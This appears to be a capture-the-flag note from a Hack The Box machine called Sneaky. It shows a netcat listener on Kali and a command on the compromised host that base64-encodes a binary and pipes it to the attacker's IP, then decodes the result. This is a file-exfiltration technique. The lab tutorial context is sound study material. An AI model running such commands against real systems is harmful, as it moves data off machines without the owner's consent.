# Netcat Redirect

If netcat is on the box you can use it to copy data back to Kali.

Set it listening on Kali first, with a redirect to file you want to save received data to:

```bash
root@kali:~/htb/sneaky# nc -lnvp 1234 > chal.b64
listening on [any] 1234 ...
```

On the box convert file to base64 the send to netcat with Kali IP and port:

```bash
thrasivoulos@Sneaky:~$ base64 /usr/local/bin/chal | nc 10.10.14.14 1234
```

Now back on Kali we need to decode it:

```bash
root@kali:~/htb/sneaky# base64 -d chal.b64 > chal
```
